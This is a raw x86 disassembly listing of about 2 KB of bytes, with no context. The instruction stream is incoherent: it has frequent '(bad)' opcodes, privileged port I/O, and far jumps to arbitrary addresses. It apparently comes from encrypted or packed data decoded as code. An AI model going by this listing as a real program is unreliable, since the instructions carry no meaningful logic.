  413f0e:	out    0xc2,eax
  413f10:	xchg   edi,eax
  413f11:	mov    ah,0x53
  413f13:	xchg   ebp,ebx
  413f15:	push   0x522efb56
  413f1a:	je     0x413eaa
  413f1c:	jecxz  0x413eaf
  413f1e:	jo     0x413f0b
  413f20:	sbb    ebx,esi
  413f22:	js     0x413ead
  413f24:	cmp    al,0x4e
  413f26:	lahf   
  413f27:	adc    dl,BYTE PTR [edx-0x6033a4dd]
  413f2d:	push   0xe9bee55e
  413f32:	imul   ebx,DWORD PTR [edi],0x68
  413f35:	pop    esi
  413f36:	jge    0x413f91
  413f38:	xlat   BYTE PTR ds:[ebx]
  413f39:	xor    eax,0xd7beed0c
  413f3e:	mov    dl,0x47
  413f40:	push   cs
  413f41:	fwait
  413f42:	push   edi
  413f43:	pop    eax
  413f44:	sbb    eax,0xd3a4f14b
  413f49:	mov    ?,WORD PTR [esi]
  413f4b:	pcmpeqd mm0,mm1
  413f4e:	and    al,BYTE PTR ds:0x1b3cdad3
  413f54:	adc    BYTE PTR [edx-0x8c2e2eb],ch
  413f5a:	jb     0x413f8d
  413f5c:	clc    
  413f5d:	arpl   WORD PTR [ebp-0x1d],bx
  413f60:	outs   dx,BYTE PTR ds:[esi]
  413f61:	push   eax
  413f62:	outs   dx,DWORD PTR ds:[esi]
  413f63:	fmul   DWORD PTR [eax]
  413f65:	jns    0x413f0d
  413f67:	xchg   edi,eax
  413f68:	push   eax
  413f69:	int    0xee
  413f6b:	mov    bl,0x61
  413f6d:	mov    ebx,0x58ed5fae
  413f72:	(bad)  
  413f73:	retf   0xc482
  413f76:	call   0x5bd4699a
  413f7b:	in     eax,dx
  413f7c:	fisub  WORD PTR [edi-0x4f3074d0]
  413f82:	iret   
  413f83:	out    dx,al
  413f84:	es mov esp,0x59998951
  413f8a:	mov    ebx,0xa379ea1
  413f8f:	jmp    0x413f3d
  413f91:	mov    dh,0x93
  413f93:	pop    es
  413f94:	xchg   esp,eax
  413f95:	push   0x27
  413f97:	push   eax
  413f98:	fdiv   QWORD PTR [eax-0x3d]
  413f9b:	pop    ss
  413f9c:	dec    esp
  413f9d:	mov    cl,0xd0
  413f9f:	xchg   ecx,eax
  413fa0:	imul   esp,DWORD PTR [esi+0x6a],0x2e820bd6
  413fa7:	out    dx,al
  413fa8:	xchg   DWORD PTR [ebx+0x0],ecx
  413fab:	sbb    edi,DWORD PTR [ebx-0x26]
  413fae:	mov    dh,0x9
  413fb0:	nop
  413fb1:	(bad)  
  413fb2:	in     al,dx
  413fb3:	sbb    eax,esi
  413fb5:	pop    esp
  413fb6:	add    ah,BYTE PTR [ebx]
  413fb8:	and    al,0x59
  413fba:	xor    DWORD PTR [eax+0xa],0xfb5f643e
  413fc1:	jp     0x414015
  413fc3:	pop    ds
  413fc4:	sbb    ch,BYTE PTR [ebp+eiz*1-0xefb9b28]
  413fcb:	and    ch,bh
  413fcd:	and    ebx,0x4da0dc8
  413fd3:	mov    ds:0xae92cf15,eax
  413fd8:	adc    dl,BYTE PTR [edi+0x79]
  413fdb:	sub    ebp,DWORD PTR [esi]
  413fdd:	rcl    BYTE PTR [ebx-0x56d8ab1d],0x44
  413fe4:	sub    BYTE PTR [eax+0x18],ah
  413fe7:	ins    DWORD PTR es:[edi],dx
  413fe8:	stc    
  413fe9:	ins    BYTE PTR es:[edi],dx
  413fea:	sbb    DWORD PTR [eax-0xfa2d96f],ecx
  413ff0:	pop    ebx
  413ff1:	sbb    ah,BYTE PTR [ebp-0x12d363d2]
  413ff7:	pop    es
  413ff8:	jne    0x413f7d
  413ffa:	addr16 clc 
  413ffc:	outs   dx,BYTE PTR ds:[esi]
  413ffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ffe:	sbb    BYTE PTR [ecx],bh
  414000:	push   ss
  414001:	xor    eax,0x331144d0
  414006:	out    dx,eax
  414007:	fidiv  DWORD PTR [edi+0x20]
  41400a:	cmp    ebp,DWORD PTR [eax-0x3883370f]
  414010:	out    0x8f,eax
  414012:	ds in  eax,0x2a
  414015:	and    dl,BYTE PTR [esi]
  414017:	mov    ds:0xdc70f981,al
  41401c:	sub    DWORD PTR [esi-0x7e],esi
  41401f:	ret    0xa3f
  414022:	inc    ebx
  414023:	idiv   DWORD PTR [ebx+edi*8+0x304ac956]
  41402a:	call   DWORD PTR [ebx]
  41402c:	pop    esp
  41402d:	jo     0x413fbb
  41402f:	add    bh,dl
  414031:	sub    esp,esi
  414033:	sahf   
  414034:	lods   eax,DWORD PTR ds:[esi]
  414035:	mov    dl,0x6a
  414037:	jne    0x413fe9
  414039:	mov    bl,0xe4
  41403b:	inc    esi
  41403c:	cmp    ebp,0xfc0502ce
  414042:	sub    ebx,ecx
  414044:	shr    BYTE PTR [ecx-0x5c0b2905],0x0
  41404b:	xchg   esi,eax
  41404c:	fld    DWORD PTR [ecx+edx*4]
  41404f:	shr    DWORD PTR [ecx+0x6d],cl
  414052:	adc    dl,BYTE PTR [eax-0x7b]
  414055:	sbb    eax,0x33fbca7c
  41405a:	ds and al,0x91
  41405d:	sbb    eax,0x8b62378b
  414062:	fnstcw WORD PTR [esi]
  414064:	and    al,0x5e
  414066:	cmp    ch,cl
  414068:	jecxz  0x41402a
  41406a:	inc    esi
  41406b:	pop    ds
  41406c:	loop   0x414000
  41406e:	scas   al,BYTE PTR es:[edi]
  41406f:	adc    esp,esp
  414071:	rol    BYTE PTR [esi+0x4334f101],1
  414077:	jg     0x414057
  414079:	arpl   WORD PTR [eax-0x19e11da7],dx
  41407f:	iret   
  414080:	mov    cl,0x75
  414082:	xor    BYTE PTR [ebx-0x4187e36a],al
  414088:	cmp    dh,BYTE PTR [edx]
  41408a:	and    eax,0x426cad74
  41408f:	lea    edx,[ebx*4-0x667d3dda]
  414096:	jle    0x414077
  414098:	push   esi
  414099:	ds jge 0x414048
  41409c:	push   esi
  41409d:	dec    ebp
  41409e:	xor    dh,BYTE PTR [ecx-0x20]
  4140a1:	int3   
  4140a2:	andnps xmm0,XMMWORD PTR [edi+0x4dd8f617]
  4140a9:	in     al,dx
  4140aa:	adc    DWORD PTR [esi+edx*1],ebp
  4140ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140ae:	js     0x41409a
  4140b0:	mov    DWORD PTR [esi-0x327966be],esi
  4140b6:	dec    ecx
  4140b7:	shl    ebx,0x64
  4140ba:	loope  0x4140e6
  4140bc:	mov    ah,0xb9
  4140be:	mov    edi,DWORD PTR [ebx-0x4fcd76c2]
  4140c4:	test   al,0x61
  4140c6:	repnz adc eax,DWORD PTR gs:[ebx-0x1b]
  4140cb:	inc    ebp
  4140cc:	pop    esi
  4140cd:	in     al,0x38
  4140cf:	mov    dl,0xe8
  4140d1:	loopne 0x4140b3
  4140d3:	test   esi,edx
  4140d5:	sti    
  4140d6:	xor    BYTE PTR [edi],dl
  4140d8:	mov    al,ds:0x2328c384
  4140dd:	xchg   BYTE PTR [ebp-0x25],ch
  4140e0:	ds jmp 0xe94c9aa8
  4140e6:	aas    
  4140e7:	pop    ebx
  4140e8:	mov    ebx,DWORD PTR ds:0xe0cbcb4c
  4140ee:	cmc    
  4140ef:	nop
  4140f0:	and    ch,BYTE PTR [edx-0x1009c505]
  4140f6:	jbe    0x4140bd
  4140f8:	pusha  
  4140f9:	sub    dl,BYTE PTR [eax-0x7dec2dd9]
  4140ff:	test   DWORD PTR [ecx-0x6277f3af],esp
  414105:	mov    dl,0x30
  414107:	bound  eax,QWORD PTR [esi-0x56b839fd]
  41410d:	cmp    dh,bh
  41410f:	push   es
  414110:	in     al,dx
  414111:	into   
  414112:	test   BYTE PTR [ebx-0x5f417603],dl
  414118:	int3   
  414119:	xor    al,0x52
  41411b:	push   esi
  41411c:	out    0xf6,eax
  41411e:	shr    BYTE PTR [eax+esi*1+0x6f],0x4d
  414123:	int    0x4b
  414125:	lea    ebp,cs:[ecx+0x5b]
  414129:	aaa    
  41412a:	adc    al,0xc2
  41412c:	mov    eax,ds:0x9a822e06
  414131:	jo     0x41416a
  414133:	adc    eax,0x4e63dbfa
  414138:	mov    bh,0x19
  41413b:	shr    ebx,0x3a
  41413e:	jl     0x41416a
  414140:	or     DWORD PTR [edi],eax
  414142:	lock stos DWORD PTR es:[edi],eax
  414144:	or     edx,0xe9939321
  41414a:	fimul  WORD PTR [eax+0x24]
  41414d:	mov    ch,0xfd
  41414f:	dec    ecx
  414150:	popf   
  414151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414152:	pop    esp
  414153:	out    0x6b,eax
  414155:	push   0x14684355
  41415a:	daa    
  41415b:	repnz add al,0x3b
  41415e:	push   ds
  41415f:	jnp    0x4141af
  414161:	in     ax,dx
  414163:	cdq    
  414164:	dec    edx
  414165:	out    dx,eax
  414166:	jmp    FWORD PTR [esi+0x5713c7bf]
  41416c:	loope  0x414115
  41416e:	dec    ecx
  41416f:	xor    eax,0x2e468720
  414174:	stos   DWORD PTR es:[edi],eax
  414175:	nop
  414176:	push   es
  414177:	leave  
  414178:	add    BYTE PTR [ecx-0x39],ch
  41417b:	sub    DWORD PTR [edi+0x6642609b],esi
  414181:	pop    ds
  414182:	jmp    0x41415c
  414184:	shl    BYTE PTR [ecx-0x555b4c10],1
  41418a:	pusha  
  41418b:	mov    edi,DWORD PTR [ecx]
  41418d:	ret    
  41418e:	xchg   ecx,eax
  41418f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414190:	sti    
  414191:	jne    0x41413f
  414193:	ja     0x414161
  414195:	(bad)  
  414196:	adc    dh,dh
  414198:	cmp    eax,0x50b58576
  41419d:	mov    eax,ds:0xabb5d8cf
  4141a2:	test   eax,0xc578b26c
  4141a7:	push   0x61
  4141a9:	cmp    DWORD PTR [ebx],ecx
  4141ab:	aaa    
  4141ac:	ds into 
  4141ae:	or     eax,0x43073a37
  4141b3:	xchg   ebp,eax
  4141b4:	inc    ecx
  4141b5:	inc    edx
  4141b6:	push   0x5d86a844
  4141bb:	js     0x414168
  4141bd:	fdivr  QWORD PTR [edi]
  4141bf:	stos   BYTE PTR es:[edi],al
  4141c0:	cmp    eax,0x3cd7b7f7
  4141c5:	fdivr  DWORD PTR [edx-0x5b]
  4141c8:	mov    cl,0xb2
  4141ca:	out    0xe4,eax
  4141cc:	xchg   esp,eax
  4141cd:	call   0xbeeb7855
  4141d2:	and    cl,BYTE PTR [edx+0x5e]
  4141d5:	and    ebx,esi
  4141d7:	xor    eax,0x42ad8928
  4141dc:	or     eax,0x220f36d2
  4141e1:	xchg   esp,eax
  4141e2:	dec    esi
  4141e3:	mov    ah,0x66
  4141e5:	mov    eax,DWORD PTR [ebx+edx*4]
  4141e8:	dec    ebx
  4141e9:	(bad)  
  4141ea:	cmp    DWORD PTR [esi+eax*2],eax
  4141ed:	push   ss
  4141ee:	ins    DWORD PTR es:[edi],dx
  4141ef:	mov    eax,ds:0xcfce6490
  4141f4:	aam    0x8a
  4141f6:	push   edi
  4141f7:	jns    0x414267
  4141f9:	jmp    0x41426e
  4141fb:	pop    edi
  4141fc:	mov    bl,BYTE PTR [edi+0x1bb3c33b]
  414202:	stc    
  414203:	cs push eax
  414205:	data16 (bad) 
  414207:	push   ebx
  414208:	xor    DWORD PTR [esi],ecx
  41420a:	leave  
  41420b:	push   ebx
  41420c:	mov    ebp,ebp
  41420e:	stos   DWORD PTR es:[edi],eax
  41420f:	adc    eax,0xb6d79311
  414214:	jecxz  0x4141f1
  414216:	lock shl BYTE PTR [esi],0xb3
  41421a:	mov    al,ds:0x4e557a9f
  41421f:	sub    bl,BYTE PTR [edx-0x4b2a81d8]
  414225:	jg     0x4141ef
  414227:	stos   BYTE PTR es:[edi],al
  414228:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414229:	das    
  41422a:	adc    DWORD PTR [ebp-0x2c16ed89],edi
  414230:	lds    ecx,FWORD PTR [ecx+0x372e7705]
  414236:	pop    ebx
  414237:	shl    DWORD PTR ds:0x98362b2a,1
  41423d:	sub    ebx,eax
  41423f:	pop    esp
  414240:	inc    esi
  414241:	dec    edx
  414242:	fcom   DWORD PTR [edx-0x5]
  414245:	mov    bl,0xff
  414247:	jno    0x414233
  414249:	xor    ah,dl
  41424b:	and    ax,0x3d17
  41424f:	pusha  
  414250:	clc    
  414251:	dec    ecx
  414252:	pop    DWORD PTR [ecx-0x345349e1]
  414258:	dec    edx
  414259:	in     al,0xa5
  41425b:	or     BYTE PTR [edi+0x7c0c5305],bl
  414261:	imul   ecx,edi
  414264:	(bad)  
  414265:	loop   0x414241
  414267:	cwde   
  414268:	pop    ecx
  414269:	lods   eax,DWORD PTR ds:[esi]
  41426a:	sub    al,0x37
  41426c:	(bad)  [edi+0x25849db4]
  414272:	jge    0x41428a
  414274:	jmp    0x20ef:0x92eb928b
  41427b:	or     BYTE PTR [ebp-0x21d102cc],0xcb
  414282:	sar    ch,cl
  414284:	stc    
  414285:	mov    ds:0x5cde1e97,eax
  41428a:	pminsw mm0,QWORD PTR [ebx-0x69]
  41428e:	ds push ds
  414290:	push   ecx
  414291:	push   ebp
  414292:	push   ds
  414293:	jp     0x414260
  414295:	sub    DWORD PTR [edx+0x1c],esp
  414298:	xor    BYTE PTR [eax+0x1b8cade],0x55
  41429f:	ficom  DWORD PTR [ebx]
  4142a1:	cmp    al,BYTE PTR [eax+0x3595c1dd]
  4142a7:	mov    es,edi
  4142a9:	push   eax
  4142aa:	push   edx
  4142ab:	lock jge 0x4142b4
  4142ae:	mov    ebp,0xaa3ce33
  4142b3:	mov    cl,0x5e
  4142b5:	shl    BYTE PTR [ebx+0x11],0x45
  4142b9:	dec    eax
  4142ba:	gs loop 0x4142da
  4142bd:	bound  esi,QWORD PTR [edi-0x6a]
  4142c0:	mov    al,0xc8
  4142c2:	mov    ds:0x6449fd32,eax
  4142c7:	dec    ebx
  4142c8:	and    DWORD PTR [ebx+ebx*2],esi
  4142cb:	xchg   edi,eax
  4142cc:	je     0x4142a5
  4142ce:	push   edi
  4142cf:	sbb    al,0xdb
  4142d1:	mov    dh,0xbd
  4142d3:	inc    esi
  4142d4:	aad    0x69
  4142d6:	jmp    0xf7ec:0xad4c1a12
  4142dd:	(bad)  
  4142de:	jbe    0x4142b0
  4142e0:	lahf   
  4142e1:	inc    eax
  4142e2:	loop   0x4142de
  4142e4:	mov    esp,DWORD PTR [eax+0x54]
  4142e7:	je     0x4142c7
  4142e9:	mov    edi,0x23cdb733
  4142ee:	jmp    0x611d169
  4142f3:	les    ebx,FWORD PTR [edi+edi*2]
  4142f6:	mov    cs,WORD PTR [eax+0x1eb5ac27]
  4142fc:	aaa    
  4142fd:	mov    ds:0x5eff96d5,al
  414302:	fimul  DWORD PTR [edi]
  414304:	into   
  414305:	push   cs
  414306:	mov    eax,0x87cb7253
  41430b:	adc    al,BYTE PTR [eax-0x7c73a253]
  414311:	dec    edi
  414312:	dec    ebx
  414313:	inc    esi
  414314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414315:	jmp    0x4142d1
  414317:	mov    bl,0xbc
  414319:	inc    edi
  41431a:	mov    cl,0x5c
  41431c:	xor    ecx,eax
  41431e:	cmp    al,ch
  414320:	xchg   ebx,eax
  414321:	add    dh,ah
  414323:	adc    eax,0xc1717569
  414328:	outs   dx,DWORD PTR ds:[esi]
  414329:	sbb    al,0xb1
  41432b:	add    eax,0xb6af94e8
  414330:	inc    edi
  414331:	lds    edx,FWORD PTR [edx-0x33]
  414334:	cdq    
  414335:	shl    dl,1
  414337:	xor    DWORD PTR [esi],0x96caef70
  41433d:	clc    
  41433e:	dec    edx
  41433f:	icebp  
  414340:	fucom  st(3)
  414342:	dec    ebx
  414343:	call   0x9777a2f8
  414348:	lods   eax,DWORD PTR ds:[esi]
  414349:	mov    dh,BYTE PTR [eax+0xa90b587]
  41434f:	or     al,cl
  414351:	inc    eax
  414352:	sbb    eax,0xdaaa759c
  414357:	sub    al,0x6e
  414359:	into   
  41435a:	outs   dx,DWORD PTR ds:[esi]
  41435b:	inc    edx
  41435c:	mov    ebx,0x187703bf
  414361:	cmp    ecx,esi
  414363:	add    eax,0x2c8039e5
  414368:	push   cs
  414369:	in     al,0x7b
  41436b:	repnz arpl WORD PTR [edi+0x3a8bbd75],ax
  414372:	aaa    
  414373:	inc    edi
  414374:	mov    edx,0x25f87e4f
  414379:	retf   
  41437a:	dec    esp
  41437b:	clc    
  41437c:	pusha  
  41437d:	test   al,0x32
  41437f:	push   ecx
  414380:	adc    cl,bh
  414382:	mov    bl,0x96
  414384:	jno    0x41439a
  414386:	xchg   ebx,eax
  414387:	pslld  mm3,QWORD PTR [edi]
  41438a:	dec    esp
  41438b:	cwde   
  41438c:	lea    edi,[edx+0x551375fa]
  414392:	sbb    cl,BYTE PTR [edi+0x3b]
  414395:	std    
  414396:	(bad)  
  414397:	daa    
  414398:	mov    dl,0x23
  41439a:	mov    ah,0xd4
  41439c:	iret   
  41439d:	dec    ecx
  41439e:	cmp    esp,DWORD PTR [ebx+0x2e]
  4143a1:	xor    DWORD PTR [ebx+0x78db93dd],edx
  4143a7:	js     0x414375
  4143a9:	cdq    
  4143aa:	dec    edx
  4143ab:	mov    bh,BYTE PTR [ebx]
  4143ad:	or     cl,BYTE PTR [edx]
  4143af:	xchg   edi,eax
  4143b0:	sub    eax,0xbefbfada
  4143b5:	dec    dl
  4143b7:	in     eax,0x81
  4143b9:	ret    
  4143ba:	xor    BYTE PTR [edi-0x60decd3e],dh
  4143c0:	mov    ch,0x63
  4143c2:	ror    DWORD PTR [edx],1
  4143c4:	sub    al,0x2d
  4143c6:	xchg   esp,eax
  4143c7:	stos   DWORD PTR es:[edi],eax
  4143c8:	mov    cl,0xfc
  4143ca:	push   ebx
  4143cb:	es call 0xcbe8412b
  4143d1:	or     ah,BYTE PTR [ebx+0xc]
  4143d4:	int3   
  4143d5:	std    
  4143d6:	leave  
  4143d7:	and    BYTE PTR [eax+0x10],cl
  4143da:	mov    edi,0xbd734f7d
  4143df:	lds    edx,FWORD PTR [ebx+edx*1+0x2117f142]
  4143e6:	ja     0x4143e5
  4143e8:	cmp    al,0x13
  4143ea:	jae    0x4143c0
  4143ec:	or     al,0xc1
  4143ee:	mov    esp,0xea535363
  4143f3:	jne    0x414449
  4143f5:	jo     0x4143b8
  4143f7:	rcr    DWORD PTR ds:0xcd97b750,1
  4143fd:	shr    BYTE PTR [eax+0x53],0x11
  414401:	cmp    dh,BYTE PTR [ecx+0x61760ceb]
  414407:	test   DWORD PTR [edi+0x21],edx
  41440a:	mov    cl,0x7b
  41440c:	xchg   ebp,eax
  41440d:	cmc    
  41440e:	add    dl,BYTE PTR [ebx+0x70]
  414411:	push   esi
  414412:	sub    ch,BYTE PTR [edx+ebp*8+0x18]
  414416:	pop    ebp
  414417:	add    DWORD PTR [esi-0x18],edi
  41441a:	push   ecx
  41441b:	shl    BYTE PTR [ebx+0x5f],cl
  41441e:	imul   DWORD PTR [edx+0xb]
  414421:	daa    
  414422:	add    DWORD PTR [ecx+0x25],eax
  414425:	out    dx,al
  414426:	stos   DWORD PTR es:[edi],eax
  414427:	push   esp
  414428:	mov    WORD PTR [eax-0x4c],ds
  41442b:	imul   edi,edx,0x5a543717
  414431:	out    dx,al
  414432:	xchg   esp,eax
  414433:	xchg   esp,eax
  414434:	mov    ss,WORD PTR [ebx-0x4]
  414437:	pop    ecx
  414438:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41443a:	jns    0x4143c1
  41443c:	imul   esp,DWORD PTR [edx-0x43],0xad6f4323
  414443:	into   
  414444:	(bad)  [ebx+0x49]
  414447:	sub    eax,0x168a6228
  41444c:	test   BYTE PTR [edx],ch
  41444e:	loope  0x414422
  414450:	sbb    BYTE PTR ds:0x10bc280e,dl
  414456:	call   0xb29b:0x573f1e9a
  41445d:	pop    ebp
  41445e:	push   ebp
  41445f:	les    eax,FWORD PTR [edi+0x6]
  414462:	test   al,0xf2
  414464:	add    esi,ebx
  414466:	pop    DWORD PTR [eax+0x78954e38]
  41446c:	sbb    eax,0xbcf725fa
  414471:	sbb    eax,0x36129fd7
  414476:	fs pop esp
  414478:	lea    ecx,[ecx-0x5d]
  41447b:	mov    ebp,0xb49ae3bb
  414480:	fsubr  st(6),st
  414482:	jmp    0x4144a8
  414484:	repz ja 0x4144c6
  414487:	sbb    eax,0xf56e94e2
  41448c:	je     0x41446d
  41448e:	mov    ds:0x25af6162,al
  414493:	rol    BYTE PTR [edx-0x2504bf14],1
  414499:	pop    ebx
  41449a:	adc    BYTE PTR [ecx-0x1adc4b52],bh
  4144a0:	lods   eax,DWORD PTR ds:[esi]
  4144a1:	dec    ebp
  4144a2:	shr    DWORD PTR [ebx+0x7080d5df],cl
  4144a8:	loopne 0x414477
  4144aa:	pop    ss
  4144ab:	adc    al,0xc8
  4144ad:	loopne 0x41452a
  4144af:	iret   
  4144b0:	rcl    BYTE PTR [ecx-0x7],0x29
  4144b4:	inc    ecx
  4144b5:	ds dec esp
  4144b7:	ja     0x414454
  4144b9:	jmp    0xfd2f:0x3686267e
  4144c0:	or     ebp,DWORD PTR [edx-0x78700ece]
  4144c6:	mov    BYTE PTR [eax+0x1],0x2d
  4144ca:	mov    ss,WORD PTR [ebx+ebx*1-0x34050af4]
  4144d1:	cdq    
  4144d2:	cwde   
  4144d3:	jmp    0x8097:0x80630a09
  4144da:	mov    esp,0x344623ad
  4144df:	adc    al,0x23
  4144e1:	push   ss
  4144e2:	mov    cl,0x5a
  4144e4:	pop    ebx
  4144e5:	out    0xdc,al
  4144e7:	outs   dx,DWORD PTR ds:[esi]
  4144e8:	jp     0x414482
  4144ea:	xchg   esi,eax
  4144eb:	push   ebx
  4144ec:	ins    DWORD PTR es:[edi],dx
  4144ed:	mov    bl,dl
  4144ef:	or     dl,BYTE PTR [eax+0x5e9151e0]
  4144f5:	push   0x61
  4144f7:	jmp    0x41456f
  4144f9:	push   ebx
  4144fa:	in     ax,0xba
  4144fd:	(bad)  
  4144fe:	cmc    
  4144ff:	xor    dl,dh
  414501:	ins    BYTE PTR es:[edi],dx
  414502:	mov    eax,0x6d2fabdf
  414507:	mov    BYTE PTR [esi-0x7dfa7b10],bl
  41450d:	ss ja  0x4144df
  414510:	inc    ebx
  414511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414512:	jg     0x41450a
  414514:	jecxz  0x4144b1
  414516:	cmp    ecx,edi
  414518:	pop    ecx
  414519:	mov    eax,0xc05ac4f9
  41451e:	jb     0x4144ab
  414520:	inc    eax
  414521:	sbb    ch,cl
  414523:	call   0x2f677af5
  414528:	or     ebx,edi
  41452a:	dec    ebp
  41452b:	xchg   DWORD PTR [ebx-0x9],ecx
  41452e:	mov    dh,0xaf
  414530:	pop    ecx
  414532:	lock dec esp
  414534:	frstor [ebx]
  414536:	inc    edx
  414537:	adc    cl,ah
  414539:	xchg   BYTE PTR [esi+0x55cf2362],ah
  41453f:	add    eax,esp
  414541:	pop    eax
  414542:	es repz (bad) 
  414545:	imul   esi,DWORD PTR [eax],0xbcd2471
  41454b:	(bad)  gs:[edx]
  41454e:	imul   edx,DWORD PTR [esi-0x2378dc0f],0x4d05df7e
  414558:	inc    esp
  414559:	jbe    0x414571
  41455b:	ja     0x4145c2
  41455d:	sub    eax,esi
  41455f:	sbb    dl,BYTE PTR [edx]
  414561:	sub    BYTE PTR [edx-0x7c],al
  414564:	xchg   DWORD PTR [ecx+0x48],edi
  414567:	mov    eax,ds:0xbff43dbf
  41456c:	int3   
  41456d:	mov    DWORD PTR [ecx+eax*4],esi
  414570:	or     al,0xda
  414572:	sbb    eax,DWORD PTR [ebx]
  414574:	push   ds
  414575:	xor    eax,0xc879c937
  41457a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41457b:	loope  0x414549
  41457d:	cli    
  41457e:	test   esp,esi
  414580:	or     esp,0xf97b3a40
  414586:	sar    ebx,cl
  414588:	(bad)  
  41458a:	add    eax,0xe8911797
  41458f:	dec    edx
  414590:	mov    edx,0xb5d6d210
  414595:	int3   
  414596:	and    al,0x15
  414598:	repnz xor bl,BYTE PTR [esi]
  41459b:	adc    bh,BYTE PTR [eax-0x2fff9ba5]
  4145a1:	pop    esi
  4145a2:	dec    eax
  4145a3:	(bad)  
  4145a5:	fs out dx,eax
  4145a7:	es jbe 0x4145be
  4145aa:	xor    esp,DWORD PTR [edi+ecx*8-0x27115174]
  4145b1:	mov    edx,0xcf693560
  4145b6:	mov    WORD PTR [edx+0x76],gs
  4145b9:	inc    ebp
  4145ba:	jno    0x414565
  4145bc:	jbe    0x4145bc
  4145be:	push   ecx
  4145bf:	jg     0x414620
  4145c1:	outs   dx,BYTE PTR ds:[esi]
  4145c2:	clc    
  4145c3:	scas   eax,DWORD PTR es:[edi]
  4145c4:	sub    BYTE PTR [ecx+esi*8+0x7d],dl
  4145c8:	mov    al,0xa3
  4145ca:	push   ss
  4145cb:	and    eax,0xfdedb2d9
  4145d0:	div    DWORD PTR [esi+0x14c054e8]
  4145d6:	and    ecx,DWORD PTR [ecx]
  4145d8:	inc    eax
  4145d9:	ins    BYTE PTR es:[edi],dx
  4145da:	mov    ebx,0x4b8c5385
  4145df:	push   esp
  4145e0:	jl     0x414565
  4145e2:	scas   eax,DWORD PTR es:[edi]
  4145e3:	aad    0xe9
  4145e5:	popf   
  4145e6:	inc    esp
  4145e7:	mov    bl,0x9b
  4145e9:	hlt    
  4145ea:	or     al,ch
  4145ec:	add    eax,0x5b7a3192
  4145f1:	mov    ah,al
  4145f3:	out    dx,al
  4145f4:	cmp    ecx,ebx
  4145f6:	dec    eax
  4145f7:	push   0x3e0111cd
  4145fc:	pusha  
  4145fd:	jp     0x414626
  4145ff:	loope  0x41462a
  414601:	push   cs
  414602:	ret    0x2cfc
  414605:	inc    ebp
  414606:	mov    ecx,0xc563e04c
  41460b:	ds mov ebp,0x5c0b1b85
  414611:	push   ds
  414612:	(bad)  [edx+eax*4+0x1fd6caf5]
  414619:	pop    ss
  41461a:	lds    ecx,FWORD PTR [ebp+0x74]
  41461d:	mov    ah,0xb6
  41461f:	test   DWORD PTR [edi-0x37e60800],edi
  414625:	push   ebp
  414626:	out    0x7,al
  414628:	repnz inc ebx
  41462a:	or     BYTE PTR [ebx-0x43371e76],0xda
  414631:	pop    edx
  414632:	in     al,0x9e
  414634:	fmulp  st(1),st
  414636:	in     al,dx
  414637:	dec    esp
  414638:	(bad)  
  414639:	int    0x50
  41463b:	mov    cs,WORD PTR [eax]
  41463d:	mov    bl,0xbf
  41463f:	shl    DWORD PTR [ebp-0x5c],0xde
  414643:	mov    al,ds:0x4bf20844
  414648:	icebp  
  414649:	sbb    ah,BYTE PTR [esi]
  41464b:	gs jmp 0x450b:0x16326f27
  414653:	sbb    esp,ecx
  414655:	in     al,dx
  414656:	ret    0xabea
  414659:	icebp  
  41465a:	mov    bh,0xfb
  41465c:	mov    ah,0x38
  41465e:	call   FWORD PTR [eax-0x63]
  414661:	and    eax,DWORD PTR [esi-0x65203bc2]
  414667:	mov    eax,ebp
  414669:	dec    edi
  41466a:	cdq    
  41466b:	adc    cl,cl
  41466d:	cdq    
  41466e:	jp     0x414631
  414670:	mov    ds:0xae73d175,al
  414675:	test   al,0xa4
  414677:	bswap  edi
  414679:	rcl    BYTE PTR [esp+ebx*8-0x28],0xf2
  41467e:	ret    
  41467f:	lds    ecx,FWORD PTR [edi-0xa]
  414682:	pop    es
  414683:	scas   eax,DWORD PTR es:[edi]
  414684:	jge    0x4146e2
  414686:	sub    al,0xd4
  414688:	mov    ds:0x2aabc248,al
  41468d:	imul   ebp,DWORD PTR ds:0x3c70acb1,0xc58ff2f3
  414697:	inc    esp
  414698:	cmp    eax,DWORD PTR [ebx]
  41469a:	ss stos DWORD PTR es:[edi],eax
  41469c:	add    eax,0xff60e7c1
  4146a1:	nop
  4146a2:	(bad)  
  4146a3:	retf   
  4146a4:	dec    ecx
  4146a5:	mov    al,ds:0xf0fc89bc
  4146aa:	sub    al,0x21
  4146ac:	test   al,0x1
  4146ae:	mov    cl,0xb
  4146b0:	add    ebx,DWORD PTR [ecx+0x9847496]
  4146b6:	cmc    
  4146b7:	jne    0x41472e
  4146b9:	xor    al,0x54
  4146bb:	mov    bl,0x75
  4146bd:	popf   
  4146be:	sbb    al,0x89
  4146c0:	pop    esi
  4146c1:	ret    0xc153
  4146c4:	mov    WORD PTR ds:0x105813ee,ds
  4146ca:	retf   0x8278
  4146cd:	addr16 mov ebx,0x974ac1f4
  4146d3:	xchg   ebx,eax
  4146d4:	or     al,0x8
  4146d6:	push   ebx
  4146d7:	xchg   esp,eax
  4146d8:	jge    0x414739
  4146da:	push   es
  4146db:	jmp    ebx
  4146dd:	adc    DWORD PTR [ebx+0x1a],0x5efbd36f
  4146e4:	dec    ebx
  4146e5:	mov    edx,0x1c1a07
  4146ea:	arpl   WORD PTR [esp+edi*8],si
  4146ed:	cmp    al,0x2b
  4146ef:	pusha  
  4146f0:	cmp    BYTE PTR [esi-0x7a855c25],0xae
  4146f7:	mov    DWORD PTR [edx-0x7dc600fd],esi
  4146fd:	in     eax,dx
  4146fe:	inc    eax
  4146ff:	mov    ss,WORD PTR [esp+edi*1+0x34]
  414703:	dec    ecx
  414704:	mov    ebp,cs
  414706:	sbb    cl,BYTE PTR [esi+0x42]
  414709:	inc    edx
  41470a:	mov    ds:0xed18b502,al
  41470f:	push   0x68
  414711:	into   
  414712:	stos   DWORD PTR es:[edi],eax
  414713:	cmp    eax,0x8c61e561
  414718:	mov    cl,BYTE PTR [edx+0x73b85a86]
  41471e:	mov    al,ds:0xc15deb48
  414723:	adc    dl,cl
  414725:	and    eax,0x9e065541
  41472a:	inc    esi
